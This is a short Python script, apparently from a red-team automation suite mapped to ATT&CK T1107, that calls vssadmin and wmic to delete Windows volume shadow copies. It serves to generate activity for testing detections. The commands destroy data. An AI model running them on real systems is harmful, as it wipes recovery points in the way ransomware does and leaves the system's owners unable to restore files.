# Name: Volume Shadow Copy Deletion with vssadmin and wmic
# RTA: delete_volume_shadow.py
# ATT&CK: T1107
# Description: Uses both vssadmin.exe and wmic.exe to delete volumne shadow copies.

import common


def main():
    common.log("Deleting volume shadow copies...")
    common.execute(["vssadmin.exe", "delete", "shadows", "/for=c:", "/oldest", "/quiet"])
    common.execute(["wmic.exe", "shadowcopy", "delete", "/nointeractive"])


if __name__ == "__main__":
    exit(main())
